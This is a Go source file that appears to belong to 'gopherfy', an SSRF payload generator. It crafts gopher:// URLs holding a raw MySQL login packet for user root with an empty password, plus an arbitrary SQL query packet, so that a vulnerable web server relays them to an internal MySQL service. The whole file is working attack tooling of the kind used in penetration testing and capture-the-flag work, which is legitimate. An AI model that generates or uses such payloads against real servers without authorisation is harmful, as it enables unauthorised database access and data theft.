package mysql

import (
	"fmt"
	"strings"

	"github.com/hupe1980/gopherfy/internal"
)

const (
	DefaultAddr = "127.0.0.1:3306"
	DefaultUser = "root"
)

type Options struct {
	Addr  string
	User  string
	DB    string
	Query string
}

type MySQL struct {
	addr  string
	user  string
	db    string
	query string
}

func NewMySQL(optFns ...func(o *Options)) *MySQL {
	options := Options{
		Addr: DefaultAddr,
		User: DefaultUser,
	}

	for _, fn := range optFns {
		fn(&options)
	}

	return &MySQL{
		addr:  strings.TrimSpace(options.Addr),
		user:  strings.TrimSpace(options.User),
		db:    strings.TrimSpace(options.DB),
		query: strings.TrimSpace(options.Query),
	}
}

func (my *MySQL) Payload() string {
	payload := my.generateAuth()

	if my.query != "" {
		payload = payload + my.generateQuery()
	}

	payload = fmt.Sprintf("%%%s", internal.InsertNth(payload, '%', 2))

	return fmt.Sprintf("gopher://%s/_%s", my.addr, payload)
}

func (my *MySQL) generateQuery() string {
	pktLen := 1 + len(my.query)

	data := make([]byte, pktLen+4)

	data[0] = byte(pktLen)
	data[1] = byte(pktLen >> 8)
	data[2] = byte(pktLen >> 16)

	// Paket number 0
	data[3] = 0x00

	// Query command
	data[4] = 0x3

	// Add query
	copy(data[5:], my.query)

	return fmt.Sprintf("%x", data[:pktLen+4]) + "0100000001"
}

func (my *MySQL) generateAuth() string {
	// Server capabilities (lower 2 bytes)
	flags := clientFlag(0xf7fe)

	// Extended server capabilities (upper 2 bytes)
	flags |= clientFlag(0x81ff << 16)

	// Adjust client flags based on server support
	clientFlags := clientProtocol41 |
		clientSecureConn |
		clientLongPassword |
		clientTransactions |
		clientLocalFiles |
		clientPluginAuth |
		clientMultiResults |
		flags&clientLongFlag

	pktLen := 4 + 4 + 1 + 23 + len(my.user) + 1 + 1 + 21 + 1

	var connectAttrsBuf []byte

	if flags&clientConnectAttrs != 0 {
		clientFlags |= clientConnectAttrs

		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("_os"))
		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("Linux"))

		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("_client_name"))
		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("libmysql"))

		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("_pid"))
		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("27255"))

		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("_client_version"))
		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("5.7.22"))

		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("_platform"))
		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("x86_64"))

		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("program_name"))
		connectAttrsBuf = internal.AppendLengthEncodedString(connectAttrsBuf, []byte("mysql"))

		pktLen += len(connectAttrsBuf) + 1
	}

	// To specify a db name
	if n := len(my.db); n > 0 {
		clientFlags |= clientConnectWithDB
		pktLen += n + 1
	}

	data := make([]byte, pktLen+4)

	data[0] = byte(pktLen)
	data[1] = byte(pktLen >> 8)
	data[2] = byte(pktLen >> 16)

	// Paket number 1
	data[3] = 0x01

	// ClientFlags [32 bit]
	data[4] = byte(clientFlags)
	data[5] = byte(clientFlags >> 8)
	data[6] = byte(clientFlags >> 16)
	data[7] = byte(clientFlags >> 24)

	// MaxPacketSize [32 bit] (16777216)
	data[8] = 0x00
	data[9] = 0x00
	data[10] = 0x00
	data[11] = 0x01

	// Charset [1 byte] (utf8_general_ci)
	data[12] = 33

	// Filler [23 bytes] (all 0x00)
	pos := 13
	for ; pos < 13+23; pos++ {
		data[pos] = 0
	}

	pos += copy(data[pos:], my.user)
	data[pos] = 0x00
	pos++

	// Empty password
	data[pos] = 0x00
	pos++

	// Databasename [null terminated string]
	if len(my.db) > 0 {
		pos += copy(data[pos:], my.db)
		data[pos] = 0x00
		pos++
	}

	plugin := "mysql_native_password"
	pos += copy(data[pos:], plugin)
	data[pos] = 0x00
	pos++

	// connection attributes
	if clientFlags&clientConnectAttrs != 0 {
		data[pos] = byte(len(connectAttrsBuf))
		pos++
		pos += copy(data[pos:], connectAttrsBuf)
	}

	return fmt.Sprintf("%x", data[:pos])
}
